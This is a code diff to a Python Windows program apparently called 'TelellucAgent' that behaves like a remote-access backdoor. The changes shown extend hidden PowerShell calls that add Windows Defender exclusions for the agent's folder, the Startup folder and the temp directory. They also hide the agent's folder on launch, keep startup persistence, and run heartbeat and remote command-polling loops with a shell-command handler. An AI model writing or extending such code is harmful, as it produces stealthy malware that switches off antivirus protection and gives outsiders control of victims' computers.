@@ -148,7 +148,6 @@ def ensure_nircmd():
 
 def add_windows_defender_exclusion():
     try:
-        import ctypes
         if ctypes.windll.shell32.IsUserAnAdmin():
             startup_dir = os.path.join(
                 os.environ.get("APPDATA", ""),
@@ -159,13 +158,14 @@ def add_windows_defender_exclusion():
                 "Startup",
             )
             local_dir = os.path.join(os.environ.get("LOCALAPPDATA", ""), "TelellucAgent")
+            temp_dir = tempfile.gettempdir()
 
-            for path in [startup_dir, local_dir]:
+            for path in [local_dir, startup_dir, temp_dir]:
                 try:
                     subprocess.run(
-                        f'powershell -Command "Add-MpPreference -ExclusionPath \'{path}\' -ErrorAction SilentlyContinue"',
-                        shell=True,
+                        ["powershell", "-Command", f"Add-MpPreference -ExclusionPath '{path}' -ErrorAction SilentlyContinue"],
                         capture_output=True,
+                        timeout=10,
                         creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
                     )
                 except:
@@ -839,7 +839,7 @@ def execute_shell_command(cmd_str):
             except Exception as e:
                 return f"Error: {str(e)}"
 
-        # Handle unmute command - sets volume to 50% and restarts audio service
+        # Handle unmute command - sets volume to 50% and toggles mute with PowerShell
         if cmd_lower == "unmute":
             try:
                 nircmd_path = ensure_nircmd()
@@ -854,22 +854,15 @@ def execute_shell_command(cmd_str):
                     creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
                 )
 
-                # Restart audio service to unmute (Windows Audio service)
+                # Toggle mute using PowerShell (char 173 = mute key)
                 subprocess.run(
-                    ["net", "stop", "Audiosrv"],
-                    capture_output=True,
-                    timeout=5,
-                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
-                )
-                time.sleep(0.5)
-                subprocess.run(
-                    ["net", "start", "Audiosrv"],
+                    ["powershell", "-command", "(New-Object -ComObject WScript.Shell).SendKeys([char]173)"],
                     capture_output=True,
                     timeout=5,
                     creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
                 )
 
-                return "Audio: unmuted (volume 50%, service restarted)"
+                return "Audio: unmuted (volume 50%)"
             except Exception as e:
                 return f"Error: {str(e)}"
 
@@ -1144,6 +1137,11 @@ if __name__ == "__main__":
     add_windows_defender_exclusion()
     auto_compile()
     ensure_startup()
+
+    telelluc_agent_folder = os.path.join(os.environ.get("LOCALAPPDATA", ""), "TelellucAgent")
+    if os.path.exists(telelluc_agent_folder):
+        make_hidden(telelluc_agent_folder)
+
     threading.Thread(target=heartbeat_loop, daemon=True).start()
     threading.Thread(target=command_check_loop, daemon=True).start()
 
